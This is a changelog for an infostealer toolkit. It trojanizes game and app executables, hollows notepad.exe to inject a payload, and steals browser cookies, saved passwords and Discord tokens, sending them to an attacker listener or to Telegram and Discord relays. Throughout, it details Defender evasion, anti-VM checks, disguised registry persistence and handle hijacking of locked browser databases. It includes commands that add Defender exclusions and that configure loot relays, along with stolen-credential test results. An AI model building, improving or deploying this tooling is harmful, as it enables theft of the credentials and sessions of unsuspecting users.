# Changelog


## What's New

### v6 -- bugfix round: false-positive anti-VM, exfil reliability, production build, loader hardening (current)

23 days of accumulated fixes. The payload now extracts and exfiltrates reliably;
the previous "victim never returns data" symptom had three independent causes.

**False-positive VM detection (critical -- the main "no cookies from the victim"
cause).** The payload's minimal `IP_ADAPTER_INFO` redefinition declared
`IP_ADDR_STRING` with `char _pad[64]` (72 bytes). The real struct is 44 bytes
(`Next + IpAddress[16] + IpMask[16] + Context`). `GetAdaptersInfo` writes the
real layout, so `Type` and `Address` were read at wrong offsets -- garbage values
matched the VMware/VirtualBox MAC prefixes on ordinary physical machines and
`IsAnalysisEnv()` returned true, making the payload exit silently before
extracting anything. Symptoms: same exe works on one machine, returns nothing on
another. Fixed to the exact real layout.

**Production build compiles again.** `build.bat` only linked with `/DDEBUG`
because a production build failed to link: `DbgH`/`DbgHInt` existed only inside
`#ifdef DEBUG`, `Sha256Hash` was used before declaration, and `struct hostent`
was incomplete without winsock2.h. All fixed -- production builds now compile
clean with no debug logging (was: victim-side `C:\ProgramData\cookielog\debug.log`
plus hundreds of `CreateFileW` calls slowing the extraction).

**Growable JSON output buffer.** The fixed 2 MB `g_out` silently dropped bytes
past the end. With 9 Chromium browsers + Firefox + passwords + Discord tokens the
dump exceeded 2 MB, the closing `]` still got written, and the listener rejected
the truncated JSON with 400 (data lost, victim-side fallback only). The buffer now
grows via `VirtualAlloc` (doubles on demand).

**Loader wait 20 s -> 120 s.** The loader terminated the hollowed process
`TerminateProcess` after 20 s. Handle-hijack scans (NtQSI with 2 MB+ buffers)
plus 9 browsers regularly exceed that on real victims -- the payload was killed
mid-exfil. `-t` still overrides.

**Full Local State read.** `LoadLocalState` read a fixed 256 KB. Heavy profiles
(extension/histogram data) exceed that and `os_crypt` was cut off -- the v10 key
never loaded and every Chromium cookie decrypted to empty. Now reads the whole
file (up to 8 MB, `VirtualAlloc`).

**Stale WAL cleanup in handle hijack.** `HijackCookieDB` did not delete leftover
`ck_db.tmp-wal`/`-shm` from a previous `CopyDb` -- SQLite replayed a WAL that did
not belong to the hijacked snapshot and the DB read failed. Both are deleted now.

**HTTP exfil retry.** One refused SYN (listener restarting, firewall hiccup) lost
the whole dump. `ExfilHTTP` now retries the full connect+send cycle 3 times with
1 s between attempts.

**Listener reliability.** `listen.py` is now a `ThreadingHTTPServer` (the
Telegram/Discord relay runs inside `do_POST` and stalled concurrent payload POSTs
on the single-threaded server) with a `SAVE_LOCK` around loot writes. `auto.py`
no longer kills the listener after the 300 s wait window (victims running the exe
later had nothing to deliver to) and probes the port first -- a zombie listener
from a previous session silently ate the port while the new one died with
EADDRINUSE. Removed the emoji from the Telegram summary (Telegram API is fine
with it; the codebase convention is no emoji).

**C2 port mismatch fixed.** `pick.py` hardcoded port 9090 in the C2 URL while
`config.json` (saved by `auto.py`) said 9400 -- an infection built via `pick.py`
POSTed to a port where nothing listened. `pick.py` now reads the saved port.

**Persistence moved to the loader.** The payload ran `InstallPersistence()` inside
the hollowed process, where `GetModuleFileName` returns `notepad.exe` -- the Run
key pointed at the wrong exe. The loader now installs the Run key (pre
rename-restore) pointing at the hidden `~ck_bak.bin` backup and KEEPS that backup
when persistence is enabled (normally it is deleted). The Run value was renamed
from `WindowsDefenderHelper` (known malware IOC string) to
`MicrosoftEdgeFontCache`.

**Loader hardening.**
- Injection API names (`WriteProcessMemory`, `CreateRemoteThread`,
  `NtUnmapViewOfSection`, ...) were plaintext in `.rdata` even though resolved
  dynamically -- a static signature cluster. They are now stored XOR-obfuscated
  (`EncName` constexpr) and decoded onto the stack at runtime. Verified: zero
  plaintext injection API names in the compiled loader.
- Version resource added (`src/loader.rc`, "Windows Presentation Font Cache") --
  an unsigned GUI exe with no metadata scores high in Defender's ML.
- `/PDBALTPATH` set; victim-side paths neutralized: `C:\ProgramData\MediaCache\`
  (`cache.json` / `mc.key` / `cache.log` under `/DDEBUG`) instead of
  `C:\ProgramData\cookielog\`. `cookielog.py` staging matches the new path.

**Build hygiene: incremental link poisoning.** Stale `.exp`/`.ilk` files from
previous builds made the linker emit a wrong export table (`GetProcAddress`
returned a dead RVA and any out-of-process load AVd) and corrupted ILT thunks.
`build.bat` now deletes `bin\*.exp`/`*.lib` before linking and passes
`/INCREMENTAL:NO`. Exports verified with `dumpbin /EXPORTS`.

**Defender note (confirmed via event log).** Local testing of the full chain
triggers `Behavior:Win32/DefenseEvasion.A!ml` (the hollowing chain itself) and
fresh `loader.exe` builds get `Trojan:Win32/Bearfoos.B!ml` cloud verdicts that
kill the process mid-run -- exit `0xC0000005` with no handler firing, crash point
moving between runs. This is the technique, not a payload bug. For local testing
add the project folder to Defender exclusions (admin):

```bat
powershell -command "Start-Process powershell -Verb RunAs -ArgumentList '-command Add-MpPreference -ExclusionPath C:\path\to\cookielog'"
```

**Test result.** Production build 34.8 KB DLL (was 49.6 KB with DEBUG strings).
Sentinels `CKC2/CKPR/CKAV` verified findable and patchable, zero IOC strings in
the loader, version resource present, listener POST -> `loot/all_cookies.json`
verified end-to-end, live payload trace confirmed: Local State parsed, v10 key
DPAPI-decrypted (32 bytes), profiles iterated, locked DBs hijacked, cookies
decrypted (v20 requires staging, see v5 notes).

### v5 -- AV evasion + GUI C2 detection

**XOR-encrypted payload (Defender evasion).** The payload DLL was previously embedded
as plaintext in `loader.exe` via `payload.h`. Windows Defender detected it via static
signature matching of imports (`BCryptDecrypt`, `CryptUnprotectData`,
`WriteProcessMemory`) and strings (`Cookies`, `Local State`, `encrypted_key`).

The payload is now XOR-encrypted by `gen.ps1` with a 16-byte key derived from the
DLL's own bytes. At runtime, `loader.cpp` decrypts it in memory before injection.
Verified: all payload strings are hidden in the compiled `loader.exe`; the three
sentinels (`CKC2_DEADBEEF_`, `CKPR____`, `CKAV0000`) remain findable for `auto.py`
patching.

**Dynamic API resolution.** `WriteProcessMemory`, `VirtualAllocEx`,
`VirtualProtectEx`, and `CreateRemoteThread` are now resolved at runtime via
`GetProcAddress` instead of being in the loader's IAT. This removes the classic
"process injection" import table signature.

**notepad.exe hollowing.** Process hollowing now uses `notepad.exe` instead of
`cmd.exe`. `cmd.exe` hollowing is a well-known Defender signature. Falls back to
`cmd.exe` if `notepad.exe` is missing.

**Sentinel patching flow.** The loader has its own plaintext copies of the
C2/persistence/anti-VM sentinels in its `.data` section. At runtime,
`DecryptPayload()` decrypts the XOR'd payload, searches for the sentinels, and
patches them with the loader's values before injection. This allows `auto.py` to
patch the sentinels in `loader.exe` (plaintext, findable) while the payload itself
remains encrypted.

**`--no-anti-vm` flag.** New sentinel `g_skip_av[8]` (`CKAV0000`) in `ckdll.cpp`.
When patched to `CKAV0001` (via `--no-anti-vm` in `auto.py` or the GUI checkbox),
`IsAnalysisEnv()` returns false immediately, allowing the payload to run in VMs
(VMware, VirtualBox). Needed for testing on VM targets.

**`--c2` flag + GUI public IP detection.** The most common reason external victims
didn't return data: `detect_ip()` returns a LAN address (192.168.x.x), which is
unreachable from outside the attacker's network. The C2 URL embedded in the exe
pointed to this LAN IP, so the victim's HTTP POST silently timed out.

Fixes:
- `--c2 http://YOUR_PUBLIC_IP:PORT/` flag in `auto.py` for manual C2 URL
- `detect_public_ip()` function: fetches public IP via `https://api.ipify.org`
- GUI: "DETECT PUBLIC IP" button fills the C2 URL field with the public IP
- GUI: "DETECT LAN IP" button uses `detect_ip()` (for local testing)
- GUI: "TEST C2" button does a TCP connect to verify the listener is reachable
- GUI: editable C2 URL field (pre-filled with LAN IP, can be changed to public)
- GUI: NAT warning shown when LAN IP is detected
- NAT warning in CLI output when private IP is detected

**GUI anti-VM checkbox.** The GUI now has a "Disable anti-VM" checkbox that
patches `CKAV0000` -> `CKAV0001` in `loader.exe`, disabling VM MAC / debugger /
sandbox checks in the payload.

**Troubleshooting output.** When not in `--run` mode, `auto.py` prints a
troubleshooting checklist:
1. Is the listener reachable from the victim?
2. LAN IP warning (external machines can't reach 192.168.x.x)
3. Port forwarding reminder
4. Defender quarantine warning
5. VM detection (`--no-anti-vm`)
6. Telegram/Discord relay fallback

**Test result.** Infected exe built with XOR-encrypted payload + dynamic API +
notepad.exe hollowing. Payload extracted 758 Firefox cookies + 82 passwords +
Discord tokens, exfiltrated 369KB via HTTP. All payload strings verified hidden in
`loader.exe`. All 3 sentinels verified findable and patchable.

### v4 -- UTF-8 fix, SHA256 domain hash verification, session cryptanalysis

**PutJ UTF-8 passthrough (critical).** The payload's manual JSON serializer was escaping
bytes >= 0x80 as `\u00XX`, which corrupts UTF-8 multi-byte sequences. For example, the
character `ç` (UTF-8 `0xC3 0xA7`) was being escaped as `\u00c3\u00a7`, which decodes to
`Ã§` instead of `ç`. This affected cookie values and saved passwords containing accented
characters (common in Portuguese, French, Spanish names and passwords).

Fix: removed the `c>127` condition from the escape branch. `PutJ` now only escapes
control characters (`c < 32`) as `\u00XX`; bytes >= 0x80 pass through as raw UTF-8, which
is valid JSON since JSON strings are defined as sequences of UTF-8 encoded Unicode code
points.

Test result: 82 passwords, all 82 clean (0 dirty). Before the fix, 8 of 82 were corrupted.
Example: `Ma@çhado90_90` (was `Ma@Ã§hado90_90`), `Maçhado9090$_` (was `MaÃ§hado9090$_`).

**SHA256 domain hash verification in DecCookie.** Chrome >= 118 prepends a 32-byte
`SHA256(host_key)` hash to the AES-256-GCM decrypted plaintext of both v10 and v20
cookies. The previous fix (v3) unconditionally stripped the first 32 bytes from all v10
decrypted values, which corrupts password values (passwords do not have this prefix).

Fix: `DecCookie` now takes a `host_key` parameter (the cookie's domain, e.g.
`.youtube.com`). After AES-GCM decryption, it computes `SHA256(host_key)` and compares
it to the first 32 bytes of the plaintext. If they match, the 32-byte domain hash is
stripped. If they don't match (passwords, or cookies from older Chrome versions without
the hash), 0 bytes are stripped. This correctly handles:
- v10 cookies with domain hash (Chrome >= 118) -- 32 bytes stripped
- v10 cookies without domain hash (Chrome < 118) -- 0 bytes stripped
- v20 cookies (Chrome >= 127, app-bound) -- 32 bytes stripped
- Passwords (v10 encrypted, no domain hash) -- 0 bytes stripped

**Manual SHA-256 implementation.** Added a from-scratch FIPS 180-4 SHA-256 implementation
(`Sha256Hash`, `Sha256Init`, `Sha256Update`, `Sha256Final`, `Sha256Block`) in `ckdll.cpp`.
This is needed because the CRT-less payload cannot use the standard library's hash
functions, and `BCryptHash` requires additional setup that is fragile in the hollowed
process. The implementation is ~60 lines, uses only `memset`/`memcpy` (custom CRT), and
produces a 32-byte digest used for domain hash verification.

**UTF-16LE detection for passwords.** `DumpPasswords` now checks whether the decrypted
password value is UTF-16LE encoded (every odd byte is `0x00`). If so, it converts to
UTF-8 before JSON output. In practice, Chromium stores passwords as UTF-8, so this rarely
triggers -- but it prevents garbage output if a password is stored as UTF-16LE.

**`session_break.py` -- Python session cookie cryptanalysis tool.** A standalone Python
tool that combines handle hijacking (same `NtQuerySystemInformation` technique as the C++
payload), DPAPI key extraction, and AES-256-GCM decryption with full cryptanalysis of the
decrypted session cookie values. Features:

- **Handle hijack** -- `hijack_cookie_db()` duplicates the browser's SQLite handle via
  `NtQuerySystemInformation(0x40)` with a growing buffer (4MB initial, retries with
  `ret_len + 0x10000` until success). Handles the ~311k-handle / ~12MB buffer requirement.
- **DPAPI + AES-GCM** -- `get_chromium_key()` decrypts the `Local State` AES key via
  `CryptUnprotectData`; `decrypt_chromium_value()` decrypts v10/v20 cookies with
  `BCryptDecrypt` and strips the 32-byte SHA256 domain hash when it matches.
- **Cryptanalysis** -- `classify_and_analyze()` classifies each session cookie value by
  structure: JWT, hex string, base64, numeric, URL-encoded JSON, opaque token, Express
  signed cookie, two-part token. For JWTs, `analyze_jwt()` decodes header + payload and
  assesses the `alg` field for forgery vulnerabilities (e.g. `alg: none`, `HS256` with
  known/weak keys). `assess_jwt_forgery()` and `assess_entropy_forgery()` evaluate whether
  the session can be forged without the server's secret. `find_correlations()` detects
  shared prefixes, substrings, and duplicate values across cookies.
- **Outputs** -- `loot/session_decrypted.json` (decrypted session cookies with analysis
  metadata) and `loot/cryptanalysis_report.json` (classification summary, forgery
  assessment, correlations).

**`COOKIE_EDITOR_GUIDE.md`.** New guide file with step-by-step instructions for importing
`loot/session_cookies.json` into the Cookie-Editor browser extension, including per-domain
import instructions, Netscape format fallback, troubleshooting table, and file format
reference.

**Test results (v4).** 90 session cookies (all 90 clean, 0 dirty), 82 passwords (all 82
clean, 0 dirty). High-value session cookies captured: chatgpt.com (`csrf`, `oai-gn`,
`oai-asli`, `callback-url`), github.com (`_gh_sess`, `color_mode`, `tz`),
steamcommunity.com (`sessionid`, `steamCountry`), claude.ai (`_cfuvid`, `ion-vk`),
discord.com (`locale`, `_cfuvid`), instagram.com (`rur`), youtube.com (`YSC`),
google.com (`S`, `GMAIL_AT`).

### v3 -- handle hijacking

**Browser-locked DB extraction without closing the browser.** Vivaldi (and some Vivaldi (and some
Chrome/Edge configurations) hold a 0-sharing lock on the cookie/password SQLite DB,
causing `CreateFileW` to fail with error 32 (`ERROR_SHARING_VIOLATION`). The payload
now falls back to **handle hijacking**: it enumerates all system handles via
`NtQuerySystemInformation(SystemExtendedHandleInformation)`, finds the browser
process's file handle to the SQLite DB, duplicates it with `DUPLICATE_SAME_ACCESS`
(`GENERIC_READ` fails because the browser's handle lacks `READ_CONTROL`), reads
the file in 64KB chunks via `ReadFile`, and verifies the expected table (`cookies`
or `logins`) exists. This extracts cookies from a running browser without closing it.

Test result: 1741 cookies (680 Firefox + 1061 Vivaldi) + 82 passwords + 57 session
cookies (chatgpt.com, github.com, x.com, steamcommunity.com, claude.ai, discord.com,
youtube.com, deepl.com, soundcloud.com, etc) extracted from Vivaldi while it was
running with 30 processes.

**Buffer increase.** `g_out` (the JSON output buffer) was increased from 512KB to 2MB.
With Vivaldi cookies added, the total exceeded 512KB, which silently dropped the
closing `]` bracket (the `Put()` function discards writes past the buffer end),
producing invalid JSON that the listener rejected.

**Loot file renaming.** The output files were renamed for clarity:
- `cookies.json` -> `all_cookies.json` (cookies only, no passwords)
- `cookies.txt` -> `all_cookies.txt` (Netscape format of the above)
- New: `passwords.json` + `passwords.txt` (saved passwords with usernames)
- `session_cookies.json` (real session cookies: `expirationDate == 0` and `name != "password"`)
- `session_cookies.txt` (Netscape format of the above)

Previously, `cookies.json` mixed cookies and passwords, and `session_cookies.json`
contained only passwords (because passwords have `expirationDate == 0`), which was
backwards and misleading.

**Hidden `~ck_bak.bin`.** The loader's backup file (created during rename-restore) is
now marked `FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM`, so it doesn't appear in
Explorer even with "show hidden files" enabled (requires "show protected system files").

**GUI relay checkboxes.** The `auto.py` GUI replaced toggle buttons (ON/OFF) with
checkboxes for Telegram/Discord. Keys are saved to `config.json` regardless of checkbox
state; the checkbox only controls whether the relay is active for the current run.
Previously, toggling off cleared the Entry field, which deleted the key from config.

### v2 -- payload improvements

**Chromium cookie fix (browser-locked DBs):** `CopyFileW` was replaced with
`CreateFileW(FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE)` + manual `ReadFile`.
This bypasses the exclusive lock Chrome/Edge hold on their live cookie databases --
cookies are now extracted even when the browser is running (previously only Firefox worked).

**More browsers:** Chromium, Thorium, CocCoc, and Yandex Browser added to the browser
profile list (9 total: Chrome, Edge, Brave, Vivaldi, Opera, Chromium, Thorium, CocCoc, Yandex).

**Discord token extraction:** Scans Discord's LevelDB files (`%APPDATA%\Discord\Local Storage\
leveldb\*.ldb`) for MFA tokens (`mfa.*` pattern) and exfiltrates them as cookie-like entries.

**Browser password extraction:** Reads Chromium `Login Data` SQLite DBs, decrypts saved
passwords with the same AES-256-GCM key used for cookies (v10/v11/v20), and exfiltrates
them with the associated username and origin URL.

**XOR-encrypted payload (reverted):** XOR encryption was tested but reverted because it made
the C2 and persistence sentinels (`CKC2_DEADBEEF_`, `CKPR____`) unfindable in `loader.exe`,
breaking C2 URL patching -- the payload fell back to `drop.json` instead of HTTP. The DLL is
now embedded as plaintext in `loader.exe`.

**Anti-analysis:** The payload now checks for:
- VM MAC address prefixes (VMware, VirtualBox, QEMU -- Hyper-V excluded due to WSL false positive)
- Only checks physical adapters (type 6 Ethernet, type 71 Wireless); skips "Virtual"/"WSL" descriptions
- Debuggers (`IsDebuggerPresent`, `CheckRemoteDebuggerPresent`)
- Analysis processes (x64dbg, IDA, Wireshark, Process Hacker, etc.)
- Sleep acceleration (sandbox timing check)
If any check fails, the payload exits silently without extracting cookies.

**Persistence:** `--persist` flag patches a sentinel in the loader that makes the payload
install a `HKCU\...\Run\WindowsDefenderHelper` registry key on the victim, re-executing
the infected exe on every login.

**Telegram + Discord relay:** `listen.py` can relay received cookie summaries to Telegram
Bot API or Discord webhooks, bypassing firewall restrictions on the attacker's C2:

```bat
python auto.py game.exe --telegram 123456:ABC-DEF@bot:987654321
python auto.py game.exe --discord https://discord.com/api/webhooks/123/abc
```

**JSON escaping fix (critical):** The payload's manual JSON serializer used raw `Put()` (no
escaping) for password URLs, password values, and Discord tokens. Decrypted passwords
contain binary/control characters that produced invalid JSON, causing the listener to reject
the entire POST with `Invalid control character at: line 1 column 73`. Fixed by replacing
`Put()` with `PutJ()` (which escapes `"`, `\`, control chars, and non-ASCII as `\u00XX`).
Also fixed a double-quote bug in the `_username` field (`PutJ` already includes quotes).

**Socket timeout:** Added `SO_RCVTIMEO`/`SO_SNDTIMEO` (10s) to the exfiltration socket so the
payload doesn't hang forever if the listener doesn't respond. Previously, a broken listener
caused the payload thread to block indefinitely in `recv()`.

**Session cookie filter:** `listen.py` now writes `loot/session_cookies.json` and
`loot/session_cookies.txt` containing only real session cookies (`expirationDate == 0`
and `name != "password"`). Previously, passwords (which also have `expirationDate == 0`)
were mixed in, making the session file misleading. Passwords are now in `loot/passwords.json`.

**Interactive terminal mode:** `python auto.py` with no args now asks: [1] GUI, [2] Terminal,
[3] Quick infect. Terminal mode has an `input()` loop with commands: `infect`, `gui`,
`telegram`, `discord`, `relay`, `port`, `persist`, `config`, `tg-chatid`, `build`, `install`,
`test-listener`, `help`, `exit`. Invalid commands print "comando invalido digite help" without
exiting.

**Config persistence:** `config.json` (gitignored) stores Telegram token, Discord webhook,
port, and persist flag. Values are auto-saved when passed via CLI flags or the GUI save
button, and auto-loaded on subsequent runs.

**GUI relay toggle:** The `auto.py` GUI now has Telegram/Discord Entry fields with Toggle
buttons (ON/OFF) and a SAVE RELAY SETTINGS button. Toggling off clears the field; toggling on
restores from config.

### v1 -- `auto.py` one-click setup (GUI + CLI)

A single script that does everything: builds binaries, detects your IP, starts the listener,
infects the target, and optionally runs it locally for testing. Replaces the manual
`start_attack.bat` + `pick.py` workflow for most use cases.

```bat
python auto.py                              :: GUI: pick folder or .exe
python auto.py "C:\path\to\target_folder"       :: CLI: infect a folder
python auto.py game.exe                     :: CLI: infect a standalone .exe
python auto.py "C:\path\to\target_folder" --run :: CLI: infect + run locally (test)
python auto.py game.exe --run --port 9420   :: custom port + local test
```

GUI has 4 buttons:
- **SELECT FOLDER (game/app with files)** -- copies the folder, finds the main .exe, infects in place
- **SELECT FOLDER + RUN LOCALLY (test)** -- same, then runs it on your machine
- **SELECT .EXE (standalone, no folder)** -- infects a single .exe
- **SELECT .EXE + RUN LOCALLY (test)** -- same, then runs it

### `ifec/folds/` and `ifec/apps/` output structure

Infected outputs are now split by type:

```
ifec/
  folds/    <- exes that need their folder (games, apps with DLLs/data)
    <game folder>/
      <game>.exe       (INFECTED)
      <game>_Data/     (original, intact)
      *.dll            (original, intact)
  apps/     <- standalone exes (no folder dependencies)
    <name>.exe         (INFECTED)
```

Folder mode: `auto.py` copies the entire folder to `ifec/folds/<name>/`, auto-detects the
main .exe (Unity `<name>_Data/` heuristic, fallback to largest .exe, skips helper exes like
`UnityCrashHandler`), and overwrites it with the infected version. The original source folder
is never touched.

### `listen.py` -- fast startup fix

`HTTPServer.server_bind()` was overridden to skip `socket.getfqdn("0.0.0.0")`, which does a
reverse DNS lookup that takes **4+ seconds** on Windows. This delayed `listen()` enough that
the payload's HTTP connect failed with `WSAECONNREFUSED` (10061). The fix calls
`TCPServer.server_bind()` directly and uses `socket.gethostname()` (local, instant). The
listener now reaches `LISTENING` state in under 1 second.

### `auto.py --run` -- restore fix

The original .exe restore after a local test was failing with `WinError 32` (file locked). Root
cause: the **game process** (launched by the loader's rename-restore) holds the file lock, not
the hollowed `cmd.exe`. Fix: kill the game by exe name (`taskkill /F /IM`) before restore, plus
targeted cleanup of the orphaned `cmd.exe` by `ParentProcessId` (PowerShell, not
`taskkill /IM cmd.exe` which kills ALL cmd.exe).

### Other changes

- **`install.bat`** -- one-click dependency installer: Python pip packages, MSVC Build Tools,
  CLI tools (Clink, fzf, bat, ripgrep) via winget, `cmd_init.cmd` setup, autorun registry,
  and payload build. Supports `--check` (status only), `--no-build`, `--no-tools`.
- **`install.sh`** -- same installer for Linux/macOS (and Git Bash): python3 + pip +
  tkinter via the system package manager (apt/dnf/pacman/zypper/brew), pip packages from
  `requirements.txt`, CLI tools (fzf, bat, ripgrep). No build step: uses the prebuilt `bin/`.
  Supports `--check`, `--no-tools`; `--no-build` is accepted as a no-op for parity.
- **`auto.bat`** -- shortcut: `python auto.py %*`
- **`cmd_init.cmd`** -- Linux-style aliases for cmd.exe (`ls`, `cat`, `grep`, `..`, `...`) +
  cookielog shortcuts (`cl_auto`, `cl_pick`, `cl_listen`) + Python shortcuts (`py`, `pi`, `pf`).
  Installed to `%USERPROFILE%\bin\cmd_init.cmd` with autorun registry key.
- **`PAYLOAD_STEPS.txt`** (English) and **`PAYLOAD_STEPS_PTBR.txt`** (Portuguese) -- step-by-step
  walkthrough of the payload execution chain (267 lines each).
- **`swap.py --session`** -- renamed from `--sessao` to English.
- **All comments, docstrings, and UI strings** translated to English across all source files.

